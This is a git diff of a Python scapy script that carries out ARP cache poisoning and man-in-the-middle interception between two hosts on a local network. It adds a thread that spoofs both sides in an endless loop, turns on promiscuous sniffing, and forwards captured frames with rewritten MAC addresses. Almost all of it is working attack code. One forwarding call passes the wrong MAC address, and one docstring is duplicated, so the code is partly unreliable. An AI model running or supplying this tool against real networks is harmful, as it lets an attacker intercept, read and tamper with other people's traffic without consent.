@@ -1,5 +1,6 @@
 import argparse
 import re
+import threading
 
 from scapy.all import send, AsyncSniffer
 from scapy.arch import get_if_hwaddr
@@ -10,7 +11,7 @@ from scapy.sendrecv import srp, sendp
 
 
 conf.verb = 0
-conf.promisc = False
+conf.promisc = True
 
 
 def get_mac(ip: str) -> str:
@@ -29,31 +30,30 @@ def get_mac(ip: str) -> str:
 
     return received_packet.hwsrc
 
-def process_packet_from_target(own_mac_address: str, packet: Packet, host_mac: str) -> None:
+def process_frame_from_target(own_mac_address: str, frame: Ether, host_mac: str) -> None:
     """
     This function processes a packet sent from our target to the host, and makes sure to change the correct variables before sending it to the host.
     :param own_mac_address: The MAC address of the host that is running this script.
-    :param packet: The intercepted packet.
+    :param frame: The intercepted frame.
     :param host_mac: Our destination's MAC (AKA router).
     """
-    modified_packet = packet.copy()
-    modified_packet[Ether].src = own_mac_address
-    modified_packet[Ether].dst = host_mac
-    send(modified_packet, verbose=False)
+    modified_frame = frame.copy()
+    modified_frame[Ether].src = own_mac_address
+    modified_frame[Ether].dst = host_mac
+    sendp(modified_frame, verbose=False)
 
 
-def process_packet_to_target(own_mac_address: str, packet: Packet, victim_mac: str) -> None:
+def process_frame_to_target(own_mac_address: str, frame: Ether, victim_mac: str) -> None:
     """
     This function processes a packet sent from our target to the host, and makes sure to change the correct variables before sending it to the host.
     :param own_mac_address: The MAC address of the host that is running this script.
-    :param packet: The intercepted packet.
+    :param frame: The intercepted frame.
     :param victim_mac: The victim host's mac address.
     """
-
-    modified_packet = packet.copy()
-    modified_packet[Ether].src = own_mac_address
-    modified_packet[Ether].dst = victim_mac
-    send(modified_packet, verbose=False)
+    modified_frame = frame.copy()
+    modified_frame[Ether].src = own_mac_address
+    modified_frame[Ether].dst = victim_mac
+    sendp(modified_frame, verbose=False)
 
 def active_spoofing(src_ip: str, dst_ip: str, dst_mac: str) -> None:
     """
@@ -62,9 +62,22 @@ def active_spoofing(src_ip: str, dst_ip: str, dst_mac: str) -> None:
     :param dst_ip: The destination ip we want to trick.
     :param dst_mac: The destination mac we want to trick.
     """
+
     spoof_packet = Ether(dst=dst_mac) / ARP(op=2, psrc=src_ip, pdst=dst_ip, hwdst=dst_mac)
     sendp(spoof_packet, verbose=False)
 
+
+def active_spoofing_both_sides(target_host_ip, target_host_mac, replace_host_ip, replace_host_mac):
+    """
+    :param target_host_ip: The target host's IP
+    :param target_host_mac: The target host's MAC
+    :param replace_host_ip: The replacement host's IP
+    :param replace_host_mac: The replacement host's MAC
+    :return:
+    """
+    while True:
+        active_spoofing(target_host_ip, replace_host_ip, replace_host_mac)
+        active_spoofing(replace_host_ip, target_host_ip, target_host_mac)
 
 def valid_ip(value):
     """
@@ -96,24 +109,29 @@ def get_args():
 def main():
     target_host_ip, replace_host_ip = get_args()
 
-    own_mac_address = get_if_hwaddr(conf.iface).upper()
+    own_mac_address = get_if_hwaddr(conf.iface)
 
     print("Retrieving both sides MAC addresses")
-    victim_mac = get_mac(target_host_ip)
-    host_mac = get_mac(replace_host_ip)
+    target_host_mac = get_mac(target_host_ip)
+    replace_host_mac = get_mac(replace_host_ip)
 
-    print("Started intercepting packets")
-    t1 = AsyncSniffer(filter=f"ether src {victim_mac} and ether dst {host_mac}",
-                      prn=lambda packet: process_packet_from_target(own_mac_address, packet, host_mac), store=0)
-    t2 = AsyncSniffer(filter=f"ether src {host_mac} and ether dst {victim_mac}",
-                      prn=lambda packet: process_packet_to_target(own_mac_address, packet, victim_mac), store=0)
-    t1.start()
-    t2.start()
+    print(target_host_ip, target_host_mac)
+    print(replace_host_ip, replace_host_mac)
 
     print("Started active spoofing...")
-    while True:
-        active_spoofing(target_host_ip, replace_host_ip, host_mac)
-        active_spoofing(replace_host_ip, target_host_ip, victim_mac)
+    active_spoofing_thread = threading.Thread(target=lambda: active_spoofing_both_sides(target_host_ip, target_host_mac, replace_host_ip, replace_host_mac))
+    active_spoofing_thread.start()
+
+    print("Started intercepting packets")
+    sniff_from_target = AsyncSniffer(filter=f"ip src {target_host_ip} and ip dst {replace_host_ip} and not ether src {own_mac_address}",
+                      prn=lambda frame: process_frame_from_target(own_mac_address, frame, replace_host_mac), store=0)
+    sniff_to_target = AsyncSniffer(filter=f"ip src {replace_host_ip} and ip dst {target_host_ip} and not ether src {own_mac_address}",
+                      prn=lambda frame: process_frame_to_target(own_mac_address, frame, replace_host_mac), store=0)
+    sniff_from_target.start()
+    sniff_to_target.start()
+
+    sniff_from_target.join()
+    sniff_to_target.join()
 
 
 if __name__ == "__main__":
